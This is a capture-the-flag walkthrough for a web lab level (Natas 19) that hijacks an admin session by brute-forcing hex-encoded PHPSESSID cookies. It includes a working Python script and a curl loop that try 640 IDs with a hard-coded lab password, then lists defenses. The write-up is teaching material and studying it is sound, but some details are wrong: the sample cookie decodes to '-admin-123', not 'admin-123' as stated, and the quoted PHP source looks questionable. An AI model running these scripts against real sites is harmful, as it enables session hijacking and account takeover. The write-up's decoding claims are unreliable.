// Challenge Overview

This level builds upon Level 18. The session ID is now encoded in a format that includes binary data represented in hex. The session ID format is: hex(username + "-" + session_id).

// Initial Analysis

Check the source code to understand the session management:

<?php session_start(); if (array_key_exists("username", $_POST) && array_key_exists("password", $_POST)) { $username = $_POST["username"]; $password = $_POST["password"]; if ($username == "admin" && $password == "admin") { $_SESSION["admin"] = "1"; } } if (array_key_exists("admin", $_SESSION) && $_SESSION["admin"] == "1") { print "Password: ..."; } else { print "You are not logged in."; } ?>

The source code is identical to Level 18. However, the session ID format is different:

PHPSESSID = 2d61646d696e2d313233

This is hexadecimal encoding of admin-123. The format is hex(username + "-" + session_id).

💡 The session ID is encoded in hexadecimal. The username part is included in the session ID, making it easier to identify which session belongs to which user.
// Solution Steps

Step 1 — Understand the encoding:

# Example: PHPSESSID = 2d61646d696e2d313233 # This decodes to: "admin-123" # Where "admin" is the username, "-" is a separator, and "123" is the session ID

Step 2 — Generate possible session IDs:

We need to try all possible session IDs from 1 to 640, encoded as admin-{id} in hex.

Step 3 — Automate with Python:

import requests import re import binascii url = "http://natas19.natas.labs.overthewire.org/" auth = ("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs") for session_id in range(1, 641): # Format: admin-{id} raw = f"admin-{session_id}" hex_encoded = binascii.hexlify(raw.encode()).decode() cookies = {"PHPSESSID": hex_encoded} response = requests.get(url, auth=auth, cookies=cookies) if "Password" in response.text: password = re.search(r"Password: ([a-zA-Z0-9]+)", response.text) if password: print(f"Valid session ID: {session_id}") print(f"Password: {password.group(1)}") break

Step 4 — Using curl:

for i in {1..640}; do session="admin-$i" hex="$(echo -n $session | xxd -p -c 1000)" curl -u natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs \ --cookie "PHPSESSID=$hex" \ http://natas19.natas.labs.overthewire.org/ | grep -q "Password" && echo "Found: $i" done
// Why It Works

The session ID vulnerability exists because:

  • Predictable format: The session ID format is username-session_id.
  • Small session ID space: The session ID is a small integer (0-640).
  • No encryption: Hex encoding is not encryption — it's easily reversible.
  • Username included: The username is part of the session ID, making it easier to identify admin sessions.
// Defense Measures
  • Use a cryptographically secure random number generator for session IDs.
  • Make session IDs long enough (at least 32 characters).
  • Do not include usernames or other identifying information in session IDs.
  • Regenerate session IDs after login and after privilege changes.
  • Validate sessions on the server side.

// Key Takeaways
🔐 Encoding ≠ Encryption

Hex and Base64 encoding are not security measures. They are easily reversible and should never be used to protect sensitive data.

🛡️ Session IDs Must Be Secure

Session IDs must be long, random, and unpredictable. Never include identifying information in session IDs.
